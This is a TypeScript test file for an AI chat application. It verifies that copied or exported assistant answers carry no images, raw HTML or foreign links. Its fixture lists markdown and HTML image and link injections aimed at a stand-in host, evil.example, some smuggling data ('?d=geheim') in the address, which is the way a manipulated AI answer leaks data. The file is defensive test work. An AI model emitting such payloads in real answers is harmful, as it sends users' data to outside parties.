import { describe, expect, it } from 'vitest'
import type { Nodes } from 'mdast'
import { fromMarkdown } from 'mdast-util-from-markdown'
import { gfmFromMarkdown } from 'mdast-util-gfm'
import { gfm } from 'micromark-extension-gfm'
import type { ChatDetail } from '@/shared/api/types'
import { buildCitationIndex } from '@/shared/ui/markdown/citations'
import * as copyFormats from './copyFormats'
import { chatAsMarkdown } from './chatExport'
import { answerAsHtml } from './copyHtml'

const ALLOWED = ['https://amt.example']
const POLICY = { allowedOrigins: ALLOWED }

// Every way an answer could make a Markdown reader fetch or link a foreign address.
const PAYLOAD = [
  'Bild ![x](https://evil.example/p.png?d=geheim) und [fremd](https://evil.example/a).',
  'HTML <img src="https://evil.example/h.png?d=geheim"> und Referenz ![r][r] [l][r].',
  'Beschreibung ![\\!\\[y\\](https://evil.example/alt.png)](https://evil.example/q.png)',
  '[[d]: https://evil.example/def.png](https://evil.example/b)',
  '',
  '![d]',
  '',
  '[r]: https://evil.example/r.png',
  '',
  '<div>',
  '![z](https://evil.example/block.png)',
  '</div>',
  '',
  'Erlaubt: [Amt](https://amt.example/seite) und `![code](https://evil.example/c.png)`',
].join('\n')

function parse(markdown: string) {
  return fromMarkdown(markdown, { extensions: [gfm()], mdastExtensions: [gfmFromMarkdown()] })
}

/**
 * What a Markdown reader would load or hide behind a link in `markdown`, as `type url`: images,
 * raw HTML and links whose text is not their own address. A bare address that a reader turns into
 * a link of itself is visible text and not listed.
 */
function activeAddresses(markdown: string): string[] {
  const found: string[] = []
  const definitions = new Map<string, string>()
  const visit = (node: Nodes) => {
    if (node.type === 'definition') definitions.set(node.identifier, node.url)
    if ('children' in node) node.children.forEach(visit)
  }
  const collect = (node: Nodes) => {
    if (node.type === 'image') found.push(`image ${node.url}`)
    if (node.type === 'imageReference') {
      found.push(`imageReference ${definitions.get(node.identifier) ?? ''}`)
    }
    if (node.type === 'link' && !(node.children.length === 1 && textOf(node) === node.url)) {
      found.push(`link ${node.url}`)
    }
    if (node.type === 'linkReference') {
      found.push(`linkReference ${definitions.get(node.identifier) ?? ''}`)
    }
    if (node.type === 'html') found.push(`html ${node.value}`)
    if ('children' in node) node.children.forEach(collect)
  }
  const tree = parse(markdown)
  visit(tree)
  collect(tree)
  return found
}

function textOf(node: Nodes): string {
  if ('value' in node) return node.value
  return 'children' in node ? node.children.map(textOf).join('') : ''
}

function chatWith(answer: string): ChatDetail {
  return {
    id: 'chat-1',
    spaceId: 'space-1',
    authorId: 'user-1',
    title: 'Titel',
    useKnowledge: true,
    status: 'PRIVATE',
    messages: [
      {
        id: 'm-1',
        chatId: 'chat-1',
        role: 'ASSISTANT',
        content: answer,
        generatedByAi: true,
        sources: [],
        createdAt: '2026-03-05T09:15:00Z',
      },
    ],
    createdAt: '2026-03-05T09:15:00Z',
    updatedAt: '2026-03-05T09:15:00Z',
  }
}

// Every copy and export format of an answer that is text. A new format exported from
// copyFormats must be added here, see the completeness check below.
const TEXT_FORMATS: Record<string, (answer: string) => string> = {
  answerAsMarkdown: (answer) => copyFormats.answerAsMarkdown(answer, POLICY),
  answerWithSources: (answer) =>
    copyFormats.answerWithSources(answer, buildCitationIndex(answer, []), POLICY),
  answerAsPlainText: (answer) => copyFormats.answerAsPlainText(answer, POLICY),
  chatAsMarkdown: (answer) => chatAsMarkdown(chatWith(answer), 'Hinweis', new Date(), POLICY),
}

describe('every copy and export format of an answer', () => {
  it('covers every answer format copyFormats exports', () => {
    const exported = Object.keys(copyFormats).filter((name) => name.startsWith('answer'))
    expect(Object.keys(TEXT_FORMATS)).toEqual(expect.arrayContaining(exported))
  })

  it.each(Object.keys(TEXT_FORMATS))(
    '%s carries no image, foreign link or HTML out of the answer',
    (format) => {
      const output = TEXT_FORMATS[format](PAYLOAD)
      expect(activeAddresses(output).filter((found) => found.includes('evil'))).toEqual([])
      expect(activeAddresses(output).filter((found) => !found.startsWith('link'))).toEqual([])
    },
  )

  it.each(['answerAsMarkdown', 'answerWithSources', 'chatAsMarkdown'])(
    '%s keeps an allowed link and shows the refused addresses as text',
    (format) => {
      const output = TEXT_FORMATS[format](PAYLOAD)
      expect(activeAddresses(output)).toContain('link https://amt.example/seite')
      expect(output).toContain('[Bild: x] (`https://evil.example/p.png?d=geheim`)')
      expect(output).toContain('fremd (`https://evil.example/a`)')
      expect(output).toContain('`![code](https://evil.example/c.png)`')
    },
  )

  it('leaves an answer without links, images or HTML as it is', () => {
    const plain =
      '## Gebühren\n\n- **42,60 Euro** für den Ausweis\n\n| a | b |\n|---|---|\n| 1 | 2 |'
    expect(copyFormats.answerAsMarkdown(plain, POLICY)).toBe(plain)
  })

  it('renders the HTML flavour of the copy from the same rules', () => {
    const html = answerAsHtml(copyFormats.answerAsMarkdown(PAYLOAD, POLICY), 'Hinweis', ALLOWED)
    expect(html).not.toContain('<img')
    expect(html).not.toContain('href="https://evil')
  })
})
